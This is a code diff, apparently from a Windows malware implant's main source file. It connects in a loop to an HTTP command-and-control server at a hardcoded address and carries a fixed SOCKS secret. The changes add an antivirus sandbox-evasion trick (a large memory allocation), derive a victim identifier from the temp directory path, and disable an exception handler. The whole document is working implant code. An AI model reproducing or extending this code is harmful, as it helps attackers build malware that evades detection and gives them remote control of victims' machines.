@@ -8,11 +8,13 @@ int main(int argc, char** argv);
 #include "commands.h"
 #include "c2.h"
 #include "crypter.h"
-#define UUID "peasant2"
+#define UUID NULL
 #define SOCKS_SECRET "VERYSECRET1337"
 const char* dlls[] = {"advapi32.dll", "gdi32.dll", "kernel32.dll", "msvcrt.dll", "ole32.dll", "shlwapi.dll", "user32.dll", "wininet.dll", "ws2_32.dll"};
 
 int main(int argc, char** argv){
+    char* sand = calloc(100*100000, 1); //allocate big memory to bypass av sandboxes
+    free(sand);
     if(imageBase == NULL || argc == 69420){
         if(imageBase == NULL)
             imageBase = GetModuleHandleA(NULL);
@@ -28,14 +30,24 @@ int main(int argc, char** argv){
                 if(GetModuleHandleA(dlls[i]) == NULL) LoadLibraryA(dlls[i]);
             isChild = 1;
         }else{
-            AddVectoredExceptionHandler(1, hand);
+            //AddVectoredExceptionHandler(1, hand);
         }
     }
     
     C2* conn;
+    char uuid[50] = {0};
+    if(UUID == NULL){
+        char tmp[MAX_PATH] = {0};
+        GetTempPathA(MAX_PATH, tmp);
+        strtok(tmp, "\\");
+        strtok(NULL, "\\");
+        strcpy(uuid, strtok(NULL, "\\"));
+    }else{
+        strcpy(uuid, UUID);
+    }
     while(1){
         //conn = newC2(SOCKS, UUID, SOCKS_SECRET, "192.168.122.1", 6968, 1000);
-        conn = newC2(HTTP, UUID, "http://192.168.122.1:1234/document/", 1000);
+        conn = newC2(HTTP, uuid, "http://192.168.122.1:1234/document/", 1000);
         if(conn == NULL){
             Sleep(60000);
             continue;
